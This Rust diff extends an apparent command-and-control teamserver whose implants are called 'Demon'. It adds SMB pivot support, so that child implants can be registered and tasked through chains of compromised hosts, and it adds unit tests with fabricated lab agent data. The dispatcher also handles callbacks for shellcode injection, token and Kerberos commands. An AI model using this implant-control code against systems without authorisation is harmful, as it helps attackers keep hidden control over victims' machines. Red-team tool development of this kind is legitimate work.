@@ -15,7 +15,9 @@ use red_cell_common::demon::{
     DemonTokenCommand,
 };
 use red_cell_common::operator::{
-    AgentResponseInfo, AgentUpdateInfo, EventCode, Message, MessageHead, OperatorMessage,
+    AgentEncryptionInfo as OperatorAgentEncryptionInfo, AgentInfo as OperatorAgentInfo,
+    AgentPivotsInfo, AgentResponseInfo, AgentUpdateInfo, EventCode, Message, MessageHead,
+    OperatorMessage,
 };
 use serde_json::Value;
 use thiserror::Error;
@@ -23,8 +25,8 @@ use time::OffsetDateTime;
 use time::format_description::well_known::Rfc3339;
 
 use crate::{
-    AgentRegistry, Database, DemonCallbackPackage, EventBus, LootRecord, SocketRelayManager,
-    TeamserverError,
+    AgentRegistry, Database, DemonCallbackPackage, DemonPacketParser, EventBus, LootRecord,
+    PivotInfo, SocketRelayManager, TeamserverError,
 };
 
 type HandlerFuture =
@@ -121,11 +123,12 @@ impl CommandDispatcher {
             },
         );
 
+        let checkin_registry = registry.clone();
         let checkin_events = events.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandCheckin),
             move |agent_id, _, _| {
-                let registry = registry.clone();
+                let registry = checkin_registry.clone();
                 let events = checkin_events.clone();
                 Box::pin(async move { handle_checkin(&registry, &events, agent_id).await })
             },
@@ -201,13 +204,34 @@ impl CommandDispatcher {
         );
 
         let socket_events = events.clone();
+        let socket_manager = sockets.clone();
         dispatcher.register_handler(
             u32::from(DemonCommand::CommandSocket),
             move |agent_id, request_id, payload| {
                 let events = socket_events.clone();
-                let sockets = sockets.clone();
+                let sockets = socket_manager.clone();
                 Box::pin(async move {
                     handle_socket_callback(&events, &sockets, agent_id, request_id, &payload).await
+                })
+            },
+        );
+
+        let pivot_registry = registry.clone();
+        let pivot_events = events.clone();
+        let pivot_database = database.clone();
+        let pivot_sockets = sockets.clone();
+        dispatcher.register_handler(
+            u32::from(DemonCommand::CommandPivot),
+            move |agent_id, request_id, payload| {
+                let registry = pivot_registry.clone();
+                let events = pivot_events.clone();
+                let database = pivot_database.clone();
+                let sockets = pivot_sockets.clone();
+                Box::pin(async move {
+                    handle_pivot_callback(
+                        &registry, &events, &database, &sockets, agent_id, request_id, &payload,
+                    )
+                    .await
                 })
             },
         );
@@ -304,6 +328,253 @@ async fn handle_checkin(
     let agent = registry.set_last_call_in(agent_id, timestamp).await?;
     events.broadcast(agent_update_event(&agent));
     Ok(None)
+}
+
+async fn handle_pivot_callback(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    database: &Database,
+    sockets: &SocketRelayManager,
+    agent_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandPivot));
+    let subcommand = parser.read_u32("pivot subcommand")?;
+
+    match subcommand.try_into() {
+        Ok(red_cell_common::demon::DemonPivotCommand::SmbConnect) => {
+            handle_pivot_connect_callback(registry, events, agent_id, request_id, &mut parser).await
+        }
+        Ok(red_cell_common::demon::DemonPivotCommand::SmbDisconnect) => {
+            handle_pivot_disconnect_callback(registry, events, agent_id, request_id, &mut parser)
+                .await
+        }
+        Ok(red_cell_common::demon::DemonPivotCommand::SmbCommand) => {
+            handle_pivot_command_callback(
+                registry,
+                events,
+                database,
+                sockets,
+                agent_id,
+                &mut parser,
+            )
+            .await
+        }
+        Ok(red_cell_common::demon::DemonPivotCommand::List) => Ok(None),
+        Err(error) => Err(CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::CommandPivot),
+            message: error.to_string(),
+        }),
+    }
+}
+
+async fn handle_pivot_connect_callback(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    parent_agent_id: u32,
+    request_id: u32,
+    parser: &mut CallbackParser<'_>,
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let success = parser.read_u32("pivot connect success")?;
+    if success == 0 {
+        return Ok(None);
+    }
+
+    let inner = parser.read_bytes("pivot connect inner demon init")?;
+    let child_agent_id = inner_demon_agent_id(&inner).map_err(|error| {
+        CommandDispatchError::InvalidCallbackPayload {
+            command_id: u32::from(DemonCommand::CommandPivot),
+            message: error.to_string(),
+        }
+    })?;
+    let existed = registry.get(child_agent_id).await.is_some();
+    let external_ip =
+        registry.get(parent_agent_id).await.map(|agent| agent.external_ip).unwrap_or_default();
+    let parsed = DemonPacketParser::new(registry.clone()).parse(&inner, external_ip).await;
+    let child_agent = match parsed {
+        Ok(crate::ParsedDemonPacket::Init(init)) => init.agent,
+        Ok(_) => {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                message: "pivot connect payload did not contain a demon init envelope".to_owned(),
+            });
+        }
+        Err(error) => {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                message: error.to_string(),
+            });
+        }
+    };
+
+    registry.add_link(parent_agent_id, child_agent.agent_id).await?;
+    let pivots = registry.pivots(child_agent.agent_id).await;
+    if existed {
+        events.broadcast(agent_update_event(&child_agent));
+    } else {
+        events.broadcast(agent_new_event(
+            "smb",
+            red_cell_common::demon::DEMON_MAGIC_VALUE,
+            &child_agent,
+            &pivots,
+        ));
+    }
+    events.broadcast(agent_response_event(
+        parent_agent_id,
+        u32::from(DemonCommand::CommandPivot),
+        request_id,
+        "Good",
+        &format!(
+            "[SMB] Connected to pivot agent [{parent_agent_id:08X}]-<>-<>-[{}]",
+            child_agent.name_id()
+        ),
+        None,
+    )?);
+    Ok(None)
+}
+
+async fn handle_pivot_disconnect_callback(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    parent_agent_id: u32,
+    request_id: u32,
+    parser: &mut CallbackParser<'_>,
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let success = parser.read_u32("pivot disconnect success")?;
+    let child_agent_id = parser.read_u32("pivot disconnect child agent id")?;
+    if success == 0 {
+        return Ok(None);
+    }
+
+    let affected =
+        registry.disconnect_link(parent_agent_id, child_agent_id, "Disconnected").await?;
+    for agent_id in affected {
+        if let Some(agent) = registry.get(agent_id).await {
+            events.broadcast(agent_update_event(&agent));
+        }
+    }
+    events.broadcast(agent_response_event(
+        parent_agent_id,
+        u32::from(DemonCommand::CommandPivot),
+        request_id,
+        "Info",
+        &format!("[SMB] Agent disconnected {child_agent_id:08X}"),
+        None,
+    )?);
+    Ok(None)
+}
+
+async fn handle_pivot_command_callback(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    database: &Database,
+    sockets: &SocketRelayManager,
+    _parent_agent_id: u32,
+    parser: &mut CallbackParser<'_>,
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let package = parser.read_bytes("pivot command package")?;
+    let parsed = DemonPacketParser::new(registry.clone()).parse(&package, String::new()).await;
+    let (child_agent_id, packages) = match parsed {
+        Ok(crate::ParsedDemonPacket::Callback { header, packages }) => (header.agent_id, packages),
+        Ok(_) => {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                message: "pivot command payload did not contain a callback envelope".to_owned(),
+            });
+        }
+        Err(error) => {
+            return Err(CommandDispatchError::InvalidCallbackPayload {
+                command_id: u32::from(DemonCommand::CommandPivot),
+                message: error.to_string(),
+            });
+        }
+    };
+
+    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
+    let updated = registry.set_last_call_in(child_agent_id, timestamp).await?;
+    events.broadcast(agent_update_event(&updated));
+    dispatch_builtin_packages(registry, events, database, sockets, child_agent_id, &packages).await
+}
+
+async fn dispatch_builtin_packages(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    database: &Database,
+    sockets: &SocketRelayManager,
+    agent_id: u32,
+    packages: &[DemonCallbackPackage],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    let mut response = None;
+
+    for package in packages {
+        let next = dispatch_builtin_package(
+            registry,
+            events,
+            database,
+            sockets,
+            agent_id,
+            package.command_id,
+            package.request_id,
+            &package.payload,
+        )
+        .await?;
+        if next.is_some() {
+            response = next;
+        }
+    }
+
+    Ok(response)
+}
+
+async fn dispatch_builtin_package(
+    registry: &AgentRegistry,
+    events: &EventBus,
+    database: &Database,
+    sockets: &SocketRelayManager,
+    agent_id: u32,
+    command_id: u32,
+    request_id: u32,
+    payload: &[u8],
+) -> Result<Option<Vec<u8>>, CommandDispatchError> {
+    if command_id == u32::from(DemonCommand::CommandGetJob) {
+        return Ok(None);
+    }
+    if command_id == u32::from(DemonCommand::CommandCheckin) {
+        return handle_checkin(registry, events, agent_id).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandProcList) {
+        return handle_process_list_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandProc) {
+        return handle_process_command_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandInjectShellcode) {
+        return handle_inject_shellcode_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandToken) {
+        return handle_token_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandScreenshot) {
+        return handle_screenshot_callback(database, events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandKerberos) {
+        return handle_kerberos_callback(events, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandSocket) {
+        return handle_socket_callback(events, sockets, agent_id, request_id, payload).await;
+    }
+    if command_id == u32::from(DemonCommand::CommandPivot) {
+        return Box::pin(handle_pivot_callback(
+            registry, events, database, sockets, agent_id, request_id, payload,
+        ))
+        .await;
+    }
+    Ok(None)
+}
+
+fn inner_demon_agent_id(bytes: &[u8]) -> Result<u32, DemonProtocolError> {
+    Ok(red_cell_common::demon::DemonEnvelope::from_bytes(bytes)?.header.agent_id)
 }
 
 async fn handle_process_list_callback(
@@ -864,6 +1135,23 @@ fn decode_fixed<const N: usize>(
     })
 }
 
+fn agent_new_event(
+    listener_name: &str,
+    magic_value: u32,
+    agent: &red_cell_common::AgentInfo,
+    pivots: &PivotInfo,
+) -> OperatorMessage {
+    OperatorMessage::AgentNew(Box::new(Message {
+        head: MessageHead {
+            event: EventCode::Session,
+            user: "teamserver".to_owned(),
+            timestamp: agent.last_call_in.clone(),
+            one_time: "true".to_owned(),
+        },
+        info: operator_agent_info(listener_name, magic_value, agent, pivots),
+    }))
+}
+
 fn agent_update_event(agent: &red_cell_common::AgentInfo) -> OperatorMessage {
     OperatorMessage::AgentUpdate(Message {
         head: MessageHead {
@@ -874,6 +1162,57 @@ fn agent_update_event(agent: &red_cell_common::AgentInfo) -> OperatorMessage {
         },
         info: AgentUpdateInfo { agent_id: agent.name_id(), marked: "Alive".to_owned() },
     })
+}
+
+fn operator_agent_info(
+    listener_name: &str,
+    magic_value: u32,
+    agent: &red_cell_common::AgentInfo,
+    pivots: &PivotInfo,
+) -> OperatorAgentInfo {
+    let parent = pivots.parent.map(|agent_id| format!("{agent_id:08X}"));
+    let links = pivots.children.iter().map(|agent_id| format!("{agent_id:08X}")).collect();
+
+    OperatorAgentInfo {
+        active: agent.active.to_string(),
+        background_check: false,
+        domain_name: agent.domain_name.clone(),
+        elevated: agent.elevated,
+        encryption: OperatorAgentEncryptionInfo {
+            aes_key: agent.encryption.aes_key.clone(),
+            aes_iv: agent.encryption.aes_iv.clone(),
+        },
+        internal_ip: agent.internal_ip.clone(),
+        external_ip: agent.external_ip.clone(),
+        first_call_in: agent.first_call_in.clone(),
+        last_call_in: agent.last_call_in.clone(),
+        hostname: agent.hostname.clone(),
+        listener: listener_name.to_owned(),
+        magic_value: format!("{magic_value:08x}"),
+        name_id: agent.name_id(),
+        os_arch: agent.os_arch.clone(),
+        os_build: String::new(),
+        os_version: agent.os_version.clone(),
+        pivots: AgentPivotsInfo { parent: parent.clone(), links },
+        port_fwds: Vec::new(),
+        process_arch: agent.process_arch.clone(),
+        process_name: agent.process_name.clone(),
+        process_pid: agent.process_pid.to_string(),
+        process_ppid: agent.process_ppid.to_string(),
+        process_path: agent.process_name.clone(),
+        reason: agent.reason.clone(),
+        note: agent.note.clone(),
+        sleep_delay: Value::from(agent.sleep_delay),
+        sleep_jitter: Value::from(agent.sleep_jitter),
+        kill_date: agent.kill_date.map_or(Value::Null, Value::from),
+        working_hours: agent.working_hours.map_or(Value::Null, Value::from),
+        socks_cli: Vec::new(),
+        socks_cli_mtx: None,
+        socks_svr: Vec::new(),
+        tasked_once: false,
+        username: agent.username.clone(),
+        pivot_parent: parent.unwrap_or_default(),
+    }
 }
 
 fn agent_response_event(
@@ -1254,8 +1593,8 @@ mod tests {
     use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
     use red_cell_common::crypto::{AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data};
     use red_cell_common::demon::{
-        DemonCommand, DemonInjectError, DemonKerberosCommand, DemonProcessCommand,
-        DemonTokenCommand,
+        DemonCommand, DemonInjectError, DemonKerberosCommand, DemonMessage, DemonPivotCommand,
+        DemonProcessCommand, DemonTokenCommand,
     };
     use red_cell_common::operator::OperatorMessage;
     use serde_json::Value;
@@ -1298,6 +1637,112 @@ mod tests {
             first_call_in: "2026-03-09T20:00:00Z".to_owned(),
             last_call_in: "2026-03-09T20:00:00Z".to_owned(),
         }
+    }
+
+    fn decode_pivot_payload(payload: &[u8]) -> Result<(u32, Vec<u8>), String> {
+        if payload.len() < 12 {
+            return Err("pivot payload too short".to_owned());
+        }
+
+        let subcommand = u32::from_le_bytes(
+            payload[0..4].try_into().map_err(|_| "invalid pivot subcommand".to_owned())?,
+        );
+        if subcommand != u32::from(DemonPivotCommand::SmbCommand) {
+            return Err(format!("unexpected pivot subcommand {subcommand}"));
+        }
+
+        let target_agent_id = u32::from_le_bytes(
+            payload[4..8].try_into().map_err(|_| "invalid pivot target".to_owned())?,
+        );
+        let outer_len = usize::try_from(u32::from_le_bytes(
+            payload[8..12].try_into().map_err(|_| "invalid pivot outer length".to_owned())?,
+        ))
+        .map_err(|_| "pivot outer length overflow".to_owned())?;
+        let outer = payload
+            .get(12..12 + outer_len)
+            .ok_or_else(|| "pivot outer buffer truncated".to_owned())?;
+        if outer.len() < 8 {
+            return Err("pivot outer buffer too short".to_owned());
+        }
+
+        let inner_target = u32::from_le_bytes(
+            outer[0..4].try_into().map_err(|_| "invalid pivot inner target".to_owned())?,
+        );
+        if inner_target != target_agent_id {
+            return Err("pivot target mismatch".to_owned());
+        }
+
+        let inner_len = usize::try_from(u32::from_le_bytes(
+            outer[4..8].try_into().map_err(|_| "invalid pivot inner length".to_owned())?,
+        ))
+        .map_err(|_| "pivot inner length overflow".to_owned())?;
+        let inner =
+            outer.get(8..8 + inner_len).ok_or_else(|| "pivot inner buffer truncated".to_owned())?;
+        Ok((target_agent_id, inner.to_vec()))
+    }
+
+    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
+        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
+        buf.extend_from_slice(bytes);
+    }
+
+    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
+        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_be_bytes).collect();
+        encoded.extend_from_slice(&[0, 0]);
+        add_length_prefixed_bytes(buf, &encoded);
+    }
+
+    fn valid_demon_init_body(
+        agent_id: u32,
+        key: [u8; AGENT_KEY_LENGTH],
+        iv: [u8; AGENT_IV_LENGTH],
+    ) -> Vec<u8> {
+        let mut metadata = Vec::new();
+        metadata.extend_from_slice(&agent_id.to_be_bytes());
+        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
+        add_length_prefixed_bytes(&mut metadata, b"operator");
+        add_length_prefixed_bytes(&mut metadata, b"lab");
+        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
+        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
+        metadata.extend_from_slice(&1337_u32.to_be_bytes());
+        metadata.extend_from_slice(&7331_u32.to_be_bytes());
+        metadata.extend_from_slice(&512_u32.to_be_bytes());
+        metadata.extend_from_slice(&2_u32.to_be_bytes());
+        metadata.extend_from_slice(&1_u32.to_be_bytes());
+        metadata.extend_from_slice(&0x1000_u64.to_be_bytes());
+        metadata.extend_from_slice(&10_u32.to_be_bytes());
+        metadata.extend_from_slice(&0_u32.to_be_bytes());
+        metadata.extend_from_slice(&1_u32.to_be_bytes());
+        metadata.extend_from_slice(&0_u32.to_be_bytes());
+        metadata.extend_from_slice(&22000_u32.to_be_bytes());
+        metadata.extend_from_slice(&9_u32.to_be_bytes());
+        metadata.extend_from_slice(&10_u32.to_be_bytes());
+        metadata.extend_from_slice(&25_u32.to_be_bytes());
+        metadata.extend_from_slice(&0_u64.to_be_bytes());
+        metadata.extend_from_slice(&0_u32.to_be_bytes());
+
+        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata);
+        let payload = [
+            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
+            7_u32.to_be_bytes().as_slice(),
+            key.as_slice(),
+            iv.as_slice(),
+            encrypted.as_slice(),
+        ]
+        .concat();
+
+        red_cell_common::demon::DemonEnvelope::new(agent_id, payload)
+            .unwrap_or_else(|error| panic!("failed to build demon init body: {error}"))
+            .to_bytes()
+    }
+
+    fn pivot_connect_payload(inner: &[u8]) -> Vec<u8> {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
+        payload.extend_from_slice(&1_u32.to_le_bytes());
+        payload.extend_from_slice(&u32::try_from(inner.len()).unwrap_or_default().to_le_bytes());
+        payload.extend_from_slice(inner);
+        payload
     }
 
     #[tokio::test]
@@ -1390,6 +1835,108 @@ mod tests {
         assert_eq!(message.packages[0].request_id, 41);
         assert_eq!(decrypt_agent_data(&key, &iv, &message.packages[0].payload)?, vec![1, 2, 3, 4]);
         assert!(registry.queued_jobs(agent_id).await?.is_empty());
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn builtin_get_job_wraps_linked_child_jobs_through_pivot_chain()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
+        let root_id = 0x0102_0304;
+        let pivot_id = 0x1112_1314;
+        let child_id = 0x2122_2324;
+        let root_key = [0x10; AGENT_KEY_LENGTH];
+        let root_iv = [0x20; AGENT_IV_LENGTH];
+        let pivot_key = [0x30; AGENT_KEY_LENGTH];
+        let pivot_iv = [0x40; AGENT_IV_LENGTH];
+        let child_key = [0x50; AGENT_KEY_LENGTH];
+        let child_iv = [0x60; AGENT_IV_LENGTH];
+
+        registry.insert(sample_agent_info(root_id, root_key, root_iv)).await?;
+        registry.insert(sample_agent_info(pivot_id, pivot_key, pivot_iv)).await?;
+        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
+        registry.add_link(root_id, pivot_id).await?;
+        registry.add_link(pivot_id, child_id).await?;
+        registry
+            .enqueue_job(
+                child_id,
+                Job {
+                    command: u32::from(DemonCommand::CommandSleep),
+                    request_id: 77,
+                    payload: vec![9, 8, 7, 6],
+                    command_line: "sleep 5".to_owned(),
+                    task_id: "task-77".to_owned(),
+                    created_at: "2026-03-09T20:12:00Z".to_owned(),
+                },
+            )
+            .await?;
+
+        let response = dispatcher
+            .dispatch(root_id, u32::from(DemonCommand::CommandGetJob), 9, &[])
+            .await?
+            .ok_or_else(|| "get job should return serialized packages".to_owned())?;
+        let message = DemonMessage::from_bytes(&response)?;
+        assert_eq!(message.packages.len(), 1);
+        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandPivot));
+
+        let first_layer = decrypt_agent_data(&root_key, &root_iv, &message.packages[0].payload)?;
+        let (first_target, first_inner) = decode_pivot_payload(&first_layer)?;
+        assert_eq!(first_target, pivot_id);
+
+        let second_layer = DemonMessage::from_bytes(&first_inner)?;
+        assert_eq!(second_layer.packages.len(), 1);
+        let second_payload =
+            decrypt_agent_data(&pivot_key, &pivot_iv, &second_layer.packages[0].payload)?;
+        let (second_target, second_inner) = decode_pivot_payload(&second_payload)?;
+        assert_eq!(second_target, child_id);
+
+        let child_message = DemonMessage::from_bytes(&second_inner)?;
+        assert_eq!(child_message.packages.len(), 1);
+        assert_eq!(child_message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
+        assert_eq!(child_message.packages[0].request_id, 77);
+        assert_eq!(
+            decrypt_agent_data(&child_key, &child_iv, &child_message.packages[0].payload)?,
+            vec![9, 8, 7, 6]
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn pivot_connect_callback_registers_child_and_link()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let database = Database::connect_in_memory().await?;
+        let registry = AgentRegistry::new(database.clone());
+        let events = EventBus::default();
+        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
+        let dispatcher =
+            CommandDispatcher::with_builtin_handlers(registry.clone(), events, database, sockets);
+        let parent_id = 0x4546_4748;
+        let parent_key = [0x21; AGENT_KEY_LENGTH];
+        let parent_iv = [0x31; AGENT_IV_LENGTH];
+        let child_id = 0x5152_5354;
+        let child_key = [0x41; AGENT_KEY_LENGTH];
+        let child_iv = [0x51; AGENT_IV_LENGTH];
+
+        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;
+
+        let response = dispatcher
+            .dispatch(
+                parent_id,
+                u32::from(DemonCommand::CommandPivot),
+                17,
+                &pivot_connect_payload(&valid_demon_init_body(child_id, child_key, child_iv)),
+            )
+            .await?;
+
+        assert_eq!(response, None);
+        assert_eq!(registry.parent_of(child_id).await, Some(parent_id));
+        assert_eq!(registry.children_of(parent_id).await, vec![child_id]);
+        assert!(registry.get(child_id).await.is_some());
         Ok(())
     }
 
